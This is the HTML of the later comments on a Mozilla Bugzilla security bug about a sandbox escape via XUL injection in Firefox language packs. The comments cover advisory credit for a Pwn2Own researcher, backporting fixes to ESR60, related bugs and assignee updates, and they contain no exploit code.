<p>Is &quot;Niklas Baumstark&quot; the only credit for this entry for advisory?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(alex.gaynor)</div></div></div><div class="change-set" id="c41"><div class="comment" data-id="14209927" data-no="41"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-41" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a8260556_580382"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a8260556_580382"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-41"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-41" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c41">Comment 41</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-01 17:11 PDT" data-time="1562026273">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-41">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-41" data-comment-id="14209927" data-ismarkdown="true" ><p>(In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c38" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #38</a>)</p>
<blockquote>
<p>Yes, we fixed this in multiple ways. Initially with small breaks in the chain (like finishing the conversion of about:telemetry to fluent, some on AMO itself) and ultimately with <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1539759" title="VERIFIED FIXED - Stop allowing markup injection via DTD in system-privileged contexts">bug 1539759</a>.</p>
<p>I&#39;m not sure what is feasible to back-port to ESR-60 for this but we should make sure this specific chain is broken enough before ZDI blogs about it.</p>
</blockquote>
<p>Is this addressed enough for ESR60?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(dveditz)</div><div class="change">Whiteboard: [adv-main68+]</div></div></div><div class="change-set" id="c42"><div class="comment" data-id="14210011" data-no="42"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-42" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a8260556_580382"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a8260556_580382"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-42"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-42" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c42">Comment 42</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-01 19:32 PDT" data-time="1562034729">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-42">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-42" data-comment-id="14210011" data-ismarkdown="true" ><p>Al: Yes, Niklas was solo for his pwn2own entry.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(alex.gaynor)</span></div></div></div><div class="change-set" id="a8883588_1689"><div class="change" id="aa8883588_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a8883588_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a8883588_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a8883588_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a8883588_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a8883588_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-02 10:08 PDT" data-time="1562087331">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Restrict mozAddonManager's special privileges to calls from the discovery pane"
   href="/show_bug.cgi?id=1539598">1539598</a></div></div></div><div class="change-set" id="a8901876_1689"><div class="change" id="aa8901876_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a8901876_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a8901876_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a8901876_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a8901876_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a8901876_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-02 15:13 PDT" data-time="1562105619">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">No longer depends on: <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Restrict mozAddonManager's special privileges to calls from the discovery pane"
   href="/show_bug.cgi?id=1539598">1539598</a></div></div></div><div class="change-set" id="c43"><div class="comment" data-id="14211947" data-no="43"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-43" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a8901876_1689"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a8901876_1689"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-43"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-43" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c43">Comment 43</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-02 15:49 PDT" data-time="1562107789">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-43">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-43" data-comment-id="14211947" data-ismarkdown="true" ><p><a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1538015" title="VERIFIED FIXED - Revisit pref sync in to mitigate sandbox escape vector">Bug 1538015</a> and <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1539598" title="VERIFIED FIXED - Restrict mozAddonManager&#39;s special privileges to calls from the discovery pane">bug 1539598</a> have been uplifted for 60.8esr, which is the most we feel comfortable landing there this late in the ESR60 life cycle (see <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1539759#c64" title="VERIFIED FIXED - Stop allowing markup injection via DTD in system-privileged contexts">bug 1539759 comment 64</a>). Calling this as fixed for esr60 as it&#39;s going to be.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="c44"><div class="comment" data-id="14212927" data-no="44"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-44" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a8901876_1689"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a8901876_1689"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-44"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-44" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c44">Comment 44</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-03 07:14 PDT" data-time="1562163275">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-44">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-44" data-comment-id="14212927" data-ismarkdown="true" ><p>Setting peterv as the assignee per <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c38" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment 38</a> where <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1539759" title="VERIFIED FIXED - Stop allowing markup injection via DTD in system-privileged contexts">bug 1539759</a> was the ultimate fix. Feel free to change it to someone more appropriate if needed.</p>
</div><div class="activity"><div class="change">Assignee: nobody &rarr; peterv</div><div class="change">Flags: <span class="activity-deleted">needinfo?(dveditz)</span></div></div></div><div class="change-set" id="a8973933_159069"><div class="change" id="aa8973933_159069">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a8973933_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a8973933_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a8973933_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a8973933_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a8973933_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-03 11:14 PDT" data-time="1562177676">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Prevent users from uploading langpacks containing exploits to AMO"
   href="/show_bug.cgi?id=1563327">1563327</a></div></div></div><div class="change-set" id="c45"><div class="comment" data-id="14214373" data-no="45"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-45" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a8973933_159069"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a8973933_159069"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-45"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-45" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c45">Comment 45</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-03 21:50 PDT" data-time="1562215857">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-45">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-45" data-comment-id="14214373" data-ismarkdown="true" ><p>(In reply to Ryan VanderMeulen [:RyanVM] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c43" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #43</a>)</p>
<blockquote>
<p><a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1538015" title="VERIFIED FIXED - Revisit pref sync in to mitigate sandbox escape vector">Bug 1538015</a> and <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1539598" title="VERIFIED FIXED - Restrict mozAddonManager&#39;s special privileges to calls from the discovery pane">bug 1539598</a> have been uplifted for 60.8esr, which is the most we feel comfortable landing there this late in the ESR60 life cycle</p>
</blockquote>
<p><a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1538015" title="VERIFIED FIXED - Revisit pref sync in to mitigate sandbox escape vector">bug 1538015</a> is relevant to <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538008" title="RESOLVED FIXED - [ ZDI-CAN-8375] UXSS priv-esc via sync (install arbitrary extensions &amp; set arbitrary preferences)">bug 1538008</a>, not so much this one.</p>
</div></div><div class="change-set" id="a9406673_280903"><div class="change" id="aa9406673_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a9406673_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a9406673_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a9406673_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a9406673_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a9406673_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-08 11:26 PDT" data-time="1562610416">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [adv-main68+] &rarr; [adv-main68+][adv-esr60.8+]</div></div></div><div class="change-set" id="a38134559_1689"><div class="change" id="aa38134559_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a38134559_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a38134559_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a38134559_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a38134559_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a38134559_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-06-04 23:25 PDT" data-time="1591338302">1 year ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security-release</span></div></div></div><div class="change-set" id="a81557785_578488"><div class="change" id="aa81557785_578488">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a81557785_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_578488" id="a81557785_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a81557785_578488"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a81557785_578488">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a81557785_578488">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-20 13:25 PDT" data-time="1634761528">10 days ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-sandbox-escape&amp;resolution=---">csectype-sandbox-escape</a></div></div></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1538007&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div></div> 
</main> 
</div> 


</body>
</html>